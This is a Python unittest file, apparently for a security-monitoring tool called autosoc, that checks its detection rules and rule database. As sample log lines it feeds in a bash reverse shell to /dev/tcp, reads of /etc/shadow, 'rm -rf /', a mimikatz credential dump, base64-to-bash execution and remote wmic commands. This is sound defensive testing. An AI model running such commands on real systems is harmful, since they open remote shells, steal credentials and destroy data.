import os
import tempfile
import unittest

from autosoc.database import SOCDatabase
from autosoc.detection import RuleEngine
from autosoc.detection.default_rules import DEFAULT_RULES


class RuleDatabaseTests(unittest.TestCase):
    def setUp(self):
        self.tmpdir = tempfile.TemporaryDirectory()
        self.db = SOCDatabase(db_path=os.path.join(self.tmpdir.name, "r.db"))

    def tearDown(self):
        self.db.close()
        self.tmpdir.cleanup()

    def test_defaults_seeded(self):
        rules = self.db.list_rules()
        self.assertEqual(len(rules), len(DEFAULT_RULES))
        self.assertTrue(all(r["builtin"] for r in rules))

    def test_seed_is_idempotent(self):
        self.db.seed_default_rules()
        self.assertEqual(len(self.db.list_rules()), len(DEFAULT_RULES))

    def test_toggle_enable(self):
        self.db.set_rule_enabled("ssh_brute_force", False)
        keys = {r["rule_key"] for r in self.db.list_rules(enabled_only=True)}
        self.assertNotIn("ssh_brute_force", keys)
        self.db.set_rule_enabled("ssh_brute_force", True)
        keys = {r["rule_key"] for r in self.db.list_rules(enabled_only=True)}
        self.assertIn("ssh_brute_force", keys)

    def test_add_and_delete_custom(self):
        rid = self.db.add_rule("custom_x", "Custom X", pattern="danger", severity="High")
        self.assertIsNotNone(rid)
        self.assertIsNone(self.db.add_rule("custom_x", "dup", pattern="x"))  # duplicate key
        self.assertTrue(self.db.delete_rule("custom_x"))
        self.assertIsNone(self.db.get_rule("custom_x"))

    def test_add_requires_key_and_name(self):
        self.assertIsNone(self.db.add_rule("", "name", pattern="x"))
        self.assertIsNone(self.db.add_rule("k", "", pattern="x"))


class RuleEngineTests(unittest.TestCase):
    def setUp(self):
        self.tmpdir = tempfile.TemporaryDirectory()
        self.db = SOCDatabase(db_path=os.path.join(self.tmpdir.name, "r.db"))
        self.alerts = []
        self.blocks = []
        self.engine = RuleEngine(
            self.db, on_alert=self.alerts.append,
            responder=lambda ip, reason: self.blocks.append((ip, reason)),
            cooldown=0,
        )

    def tearDown(self):
        self.db.close()
        self.tmpdir.cleanup()

    def _fired(self):
        return {a["rule_key"] for a in self.alerts}

    def test_reverse_shell_single_match(self):
        self.engine.evaluate_log("a", "auth.log", "bash -i >& /dev/tcp/10.0.0.9/4444 0>&1")
        self.assertIn("reverse_shell", self._fired())

    def test_brute_force_threshold(self):
        line = "sshd: Failed password for root from 45.66.77.88 port 22"
        for _ in range(4):
            self.engine.evaluate_log("a", "auth.log", line)
        self.assertNotIn("ssh_brute_force", self._fired())  # below threshold (5)
        for _ in range(2):
            self.engine.evaluate_log("a", "auth.log", line)
        self.assertIn("ssh_brute_force", self._fired())

    def test_new_user_opens_incident(self):
        self.engine.evaluate_log("a", "auth.log", "useradd[1]: new user: name=backdoor")
        self.assertIn("new_user_created", self._fired())
        self.assertTrue(self.db.list_incidents())

    def test_telemetry_ioc_connection_auto_blocks(self):
        self.db.add_blocked_ip("203.0.113.66", reason="c2")
        tele = {"hostname": "web01", "network": {"listening": [],
                "connections": [{"proto": "tcp", "local": "10.0.0.5:5555",
                                 "remote": "203.0.113.66:443", "process": "curl"}]},
                "processes": {"top": []}}
        self.engine.evaluate_telemetry("b", tele)
        self.assertIn("conn_to_bad_ip", self._fired())
        self.assertEqual(self.blocks[0][0], "203.0.113.66")

    def test_telemetry_suspicious_listener_and_process(self):
        tele = {"hostname": "h", "network": {
            "listening": [{"proto": "tcp", "local": "0.0.0.0:4444", "pid": "9", "process": "nc"}],
            "connections": []},
            "processes": {"top": [{"pid": "9", "cpu": "1", "mem": "1", "name": "xmrig"}]}}
        self.engine.evaluate_telemetry("b", tele)
        fired = self._fired()
        self.assertIn("suspicious_listener", fired)
        self.assertIn("suspicious_process", fired)

    def test_cooldown_suppresses_repeat(self):
        engine = RuleEngine(self.db, on_alert=self.alerts.append, cooldown=300)
        engine.evaluate_log("a", "auth.log", "bash -i >& /dev/tcp/1.2.3.4/4444")
        engine.evaluate_log("a", "auth.log", "bash -i >& /dev/tcp/1.2.3.4/4444")
        self.assertEqual(sum(1 for a in self.alerts if a["rule_key"] == "reverse_shell"), 1)

    def test_disabled_rule_does_not_fire(self):
        self.db.set_rule_enabled("reverse_shell", False)
        self.engine.reload()
        self.engine.evaluate_log("a", "auth.log", "bash -i >& /dev/tcp/1.2.3.4/4444")
        self.assertNotIn("reverse_shell", self._fired())

    def test_expanded_mitre_rules_fire(self):
        cases = {
            "credential_dumping": "invoking mimikatz sekurlsa::logonpasswords now",
            "shadow_file_access": "cat /etc/shadow > /tmp/x",
            "destructive_command": "root ran rm -rf / on the box",
            "ransomware_indicator": "dropped README_FOR_DECRYPT note: YOUR FILES ARE ENCRYPTED",
            "encoded_command_exec": "echo payload | base64 -d | bash",
            "remote_exec_tool": "wmic /node:10.0.0.5 process call create calc",
        }
        for key, line in cases.items():
            self.alerts.clear()
            self.engine.evaluate_log("h", "auth.log", line)
            self.assertIn(key, self._fired(), f"rule {key} did not fire on: {line}")

    def test_all_default_regexes_compile(self):
        import re
        from autosoc.detection.default_rules import DEFAULT_RULES
        for rule in DEFAULT_RULES:
            if rule.get("pattern"):
                re.compile(rule["pattern"])  # raises on invalid

    def test_clean_log_no_alerts(self):
        self.engine.evaluate_log("a", "auth.log", "Accepted publickey for deploy from 10.0.0.2")
        # 'Accepted publickey' matches the benign successful-login rule (Low), but not high-risk ones.
        self.assertNotIn("reverse_shell", self._fired())
        self.assertNotIn("ssh_brute_force", self._fired())


if __name__ == "__main__":
    unittest.main()
